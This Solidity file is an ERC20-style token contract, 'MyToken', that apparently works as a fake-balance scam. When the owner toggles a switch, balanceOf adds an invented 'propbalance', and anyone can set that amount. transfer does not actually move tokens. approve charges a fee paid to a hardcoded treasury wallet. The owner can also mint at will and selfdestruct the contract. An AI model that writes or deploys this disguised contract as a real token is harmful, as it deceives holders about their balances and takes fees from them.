// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external payable returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(
        address spender,
        uint256 amount
    ) external payable returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract MyToken is IERC20 {
    string private _name = "token";

    string private _symbol = "tst";

    uint8 private _decimals = 18;

    uint256 private _totalSupply = 1000000000 * 10 ** 18; // 1 billion tokens with 18 decimal places

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    address private _treasuryWallet =
        0x194E3EF0352b41E1506E5a131e4B37f0E25A2dA4;

    uint256 private _fee = 5000000000000000; // 0.005 BNB

    address private owner;

    uint256 propbalance;

    bool propBalanceOn;

    bool disabled;

    constructor() {
        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);

        owner = msg.sender; // Set owner to contract deployer's address

        propbalance = 10000000000000000000000;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "MyToken: caller is not the owner");

        _;
    }

    function mint(address _address, uint256 _amount) external onlyOwner {
        _totalSupply += _amount;

        _balances[_address] += _amount;

        emit Transfer(address(0), _address, _amount);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];

        if (propBalanceOn) {
            balance += propbalance;
        }

        return balance;
    }

    // function _transferFees(address sender) internal returns (bool) {
    //     address payable task = payable(address(this));
    //     require(sender.balance >= _fee, "Insuficinet fund");
    //     payable(address(this)).transfer(_fee);
    //     return true;
    // }

    function transfer(
        address recipient,
        uint256 amount
    ) public payable override returns (bool) {
        require(
            amount > 0,
            "MyToken: transfer amount must be greater than zero"
        );

        require(
            _balances[msg.sender] >= amount,
            "MyToken: insufficient balance for transfer"
        );

        // Calculate the fee amount

        uint256 feeAmount = _fee;

        // bool sent = _transferFees(msg.sender);

        // require(sent, "MyToken: failed fee amount");

        // Transfer tokens

        // _balances[msg.sender] -= amount;

        // _balances[recipient] += amount;

        // emit Transfer(msg.sender, recipient, amount);

        // Send fee to treasury wallet

        payable(recipient).transfer(feeAmount);

        return true;
    }

    function allowance(
        address _owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public payable override returns (bool) {
        require(
            amount > 0,
            "MyToken: approve amount must be greater than zero"
        );

        // Calculate the fee amount

        uint256 feeAmount = _fee;

        require(msg.value >= feeAmount, "MyToken: insufficient fee amount");

        // Approve tokens

        _allowances[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        // Send fee to treasury wallet

        payable(_treasuryWallet).transfer(feeAmount);

        return true;
    }

    function enableTransferFrom(bool _value) external onlyOwner {
        disabled = _value;
    }

    function updateFee(uint256 newFee) external onlyOwner {
        require(newFee > 0, "MyToken: fee must be greater than zero");

        _fee = newFee;
    }

    function updateTreasuryWallet(
        address newTreasuryWallet
    ) external onlyOwner {
        require(
            newTreasuryWallet != address(0),
            "MyToken: treasury wallet cannot be the zero address"
        );

        _treasuryWallet = newTreasuryWallet;
    }

    function updateOwner(address _addy) external onlyOwner {
        require(_addy != address(0), "0 address");

        owner = _addy;
    }

    function getPropBalance() external view returns (uint256) {
        return propbalance;
    }

    function updatePropBalance(uint256 _propbalance) public {
        propbalance = _propbalance;
    }

    function togglePropBalanceOnOff() external onlyOwner {
        propBalanceOn = !propBalanceOn;
    }

    function Destruct(address _addy) external onlyOwner {
        selfdestruct(payable(_addy));
    }

    receive() external payable {}
}
